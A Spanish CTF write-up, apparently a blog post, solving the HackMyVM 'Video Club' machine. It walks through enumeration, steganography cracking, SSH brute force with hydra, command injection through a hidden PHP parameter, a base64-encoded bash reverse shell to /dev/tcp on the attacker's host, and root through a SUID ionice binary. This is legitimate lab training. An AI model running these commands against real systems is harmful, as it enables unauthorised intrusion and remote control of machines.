---
title: ShellDredd - Video Club
layout: post
tags:
- ctf
- post
- writeups
- shelldredd
---
# Descripción
---

Creando esta máquina CTF me he dado cuenta de que ya tengo 3 décadas encima, de las cuales he vivido experiencias y conocido lugares que quizás jamás regresen, como lo es/fueron los "Video Club" o "Blockbuster", practicamente extintos en la actualidad. Esta máquina alberga diversos métodos de cierta dificultad en su enumeración e intrusión al sistema a través del servicio web. La parte de sistema está estrucuturada con un nivel más adecuado a conocimentos básicos, dado que el tiempo y técnicas de la intrusión web son el fuerte de la máquina. [Esta máquina contiene varios secretos o easter eggs, te animo a que investigues y descubras cada uno de ellos.]

# Solución
---

La descripción del autor nos cuenta que está máquina tiene de temática los "Video Club". Nos cuenta también que está enfocada en la enumeración, los ataques web y que la dificultad está en la intrución.

Con esta información lo primero que realizo es un curl a la ip.

![](/images/images-shelldredd/videoclub1.png)

Pero me dice que no existe respuesta, esto me hace pensar que quizás el servidor web está en otro puerto como el 8000, 8080 o 443. Como tengo la máquina en local enumero con nmap todos los puertos, ya que es más rápido.

![](/images/images-shelldredd/videoclub2.png)

Veo un puerto 22 SSH y un 3377 que debería ser el servidor web, realizo curl a este nuevo puerto y confirmo que es el servidor web.

![](/images/images-shelldredd/videoclub3.png)

Desde este punto esta máquina destaca de las que siempre veo, está muy trabajada y es muy atractiva a la vista, esto hace más entretenido el proceso de resolver la máquina.

![](/images/images-shelldredd/videoclub4.png)

Después de enumerar un rato sin encontrar nada útil empiezo con la enumeración automatizada con gobuster.

![](/images/images-shelldredd/videoclub5.png)

Me señala que el archivo `robots.txt` existe.

![](/images/images-shelldredd/videoclub6.png)

Veo una cadena que parece base64, intento descifrarla pero no obtengo nada. Me llevo esta cadena a [cyberchef](https://gchq.github.io/CyberChef/) para seguir intentando.

![](/images/images-shelldredd/videoclub7.png)

Resulta que solo era un mensaje. Aunque utilizé la opción `magic` de cyberchef quería saber en qué formato exactamente está cifrado.

![](/images/images-shelldredd/videoclub8.png)

Es rot13 con base64.

![](/images/images-shelldredd/videoclub9.png)

Pero el archivo robots.txt no termina ahí. Al final del robots.txt podemos ver el nombre de otro archivo `list-defaulters.txt`.


![](/images/images-shelldredd/videoclub10.png)

Este archivo nos muestro un listado de nicknames de amigos de shelldredd, un mesaje a **sml** (el creador de [HackMyVM](https://hackmyvm.eu/)) y una mensaje a HackMyVM por su aniversario.

En este punto probé varias cosas, metí el listado de nicknames a un diccionario y empezé a fuzzear directorios con este diccionario, probé realizando ataques de fuerza bruta por SSH utilizando este diccionario como user y password.

![](/images/images-shelldredd/videoclub11.png)

Pero no conseguí nada. Seguí enumerando pero con más calma y empecé a leer los nombres de usuario.

![](/images/images-shelldredd/videoclub12.png)

Hay un nombre de usuario llamado `steg` y otro llamado `hide`, no creo que existan dos personas con estos nombre así que me puse a enumerar todos los videos e imágenes de la página.

![](/images/images-shelldredd/videoclub13.png)

Me descargué todo el sitio web con `wget` (intenté varias veces porque a veces se descarga todo y a veces no), y me puse a probar steghide con cada imagen. Luego hice un for loop para realizar un ataque de fuerza bruta a cada imagen con `stegseek` y `rockyou.txt`.

![](/images/images-shelldredd/videoclub14.png)

Pude romper dos archivos.

![](/images/images-shelldredd/videoclub15.png)

Metí las dos contraseñas en el diccionario de nombres de usuarios.

![](/images/images-shelldredd/videoclub16.png)

Uno de los archivos contiene una cadena de texto y el otro tiene un cadena en hexadecimal.

![](/images/images-shelldredd/videoclub17.png)

La cadena en hexadecimal dice `tr0n`. Metí ambas cadenas de texto a mi diccionario.

![](/images/images-shelldredd/videoclub18.png)


Luego de probar con las imágenes probé con los videos. Primero descargué los videos con `wget`.

![](/images/images-shelldredd/videoclub26.png)

Probé con steghide pero no soporta videos, así que me puse a ver los metadatos.

![](/images/images-shelldredd/videoclub19.png)

Noté que el Copyrigth se veía un poco raro, así que los anoté en un archivo.

![](/images/images-shelldredd/videoclub20.png)

![](/images/images-shelldredd/videoclub27.png)

Los agregué todos al diccionario porque me podrían servir.

![](/images/images-shelldredd/videoclub29.png)

Pero hay una cadena de texto rara que parece braile.

![](/images/images-shelldredd/videoclub30.png)

Al parecer es braile pero no sé qué significa. De todas formas lo metí al diccionario.

![](/images/images-shelldredd/videoclub31.png)

Hice lo mismo con las imágenes.

![](/images/images-shelldredd/videoclub23.png)

![](/images/images-shelldredd/videoclub32.png)

En este punte intenté con fuerza bruta por SSH con este diccionarion utilizandolo de user y password con hydra

![](/images/images-shelldredd/videoclub25.png)

Seguí enumerando la página web, leyendo el código fuente, mirando las peticiones, las cookies fuzzeando directorios con varios diccionarios, enumerando UDP con nmap, etc. Pero al final me quedé sin ideas.

Leí un hint que señalaba utilizar el diccionario para fuzzear los directorios de la página.

Enumeré con gobuster los directorios utilizando el diccionario y agregando extensiones comúnes. Agregé la extensión php porque anteriormente descubrimos la ruta `/manual` que existe en aplicaciones Apache.

Encuentro el archivo `c0ntr0l.php`.

![](/images/images-shelldredd/videoclub34.png)

Al irme a la página me aparece en blanco, esto me hace pensar que debo enumerar un parámetro.

Ya parece bastante obvio que debo utilizar el diccionario para enumerar el parámetro, pero no sé si este parametro sirve para listar archivos o para ejecutar comandos.

Primero pruebo con el `/etc/passwd` pero no consigo resultados.

![](/images/images-shelldredd/videoclub35.png)

Pruebo con el comando `id` y consigo ejecución de comandos con el parámetro `f1ynn`.

![](/images/images-shelldredd/videoclub36.png)

Formo una reverse shell en base64.

![](/images/images-shelldredd/videoclub37.png)

Me pongo en escucha por el puerto 1337.

![](/images/images-shelldredd/videoclub38.png)

Y hago que el backdoor desencripte la cadena en base64 y la ejecute.

```
echo YmFzaCAtYyAnYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjkxLzEzMzcgMD4mMScK | base64 -d | bash
```

![](/images/images-shelldredd/videoclub39.png)

El comando se queda esperando y recibo una reverse shell.

![](/images/images-shelldredd/videoclub40.png)

Después de realizar un tratamiento de la tty y enumerar un poco obtengo la flag de usuario.

![](/images/images-shelldredd/videoclub41.png)

Enumero los archivos con permisos SUID y me aparece el archivo ionice. 

![](/images/images-shelldredd/videoclub42.png)

Lo busco en [GTFOBins](https://gtfobins.github.io/gtfobins/ionice/#suid) y encuentro una forma de obtener root.

![](/images/images-shelldredd/videoclub43.png)

En la ruta `/root` debería estar la flag de root pero solo nos encontramos con una nota para el nuevo administrador.

![](/images/images-shelldredd/videoclub44.png)

Nos dice que la película root.txt se ha movido y debemos encontrarla.

![](/images/images-shelldredd/videoclub45.png)

La encontramos con el comando find y está ubicada en `/opt`

![](/images/images-shelldredd/videoclub46.png)

Tenemos la flag y un "ASCII art" que no entiendo qué es xD?.

![](/images/images-shelldredd/videoclub47.png)

# Usuario librarian

Después de rootear la máquina me quedó la duda sobre el usuario librarian.

Si enumeramos la ruta `/home` vemos un directorio con el nombre `secret_film` que contiene un archivo llamado `dark.mp4`. 

![](/images/images-shelldredd/videoclub48.png)

Podemos descargar este archivo iniciando un servidor HTTP con python.

Ejecutamos `python3 -m http.server 8080` en la máquina víctima y `wget <ip victima>:8080/dark.mp4` en nuestra máquina.

![](/images/images-shelldredd/videoclub49.png)

Si leemos los metadatos del video obtendremos las credenciales del usuario `librarian`.

![](/images/images-shelldredd/videoclub50.png)

Ingresamos por SSH con el usuario librarian y la contraseña `h4ns0l0`.

![](/images/images-shelldredd/videoclub52.png)

![](/images/images-shelldredd/videoclub51.png)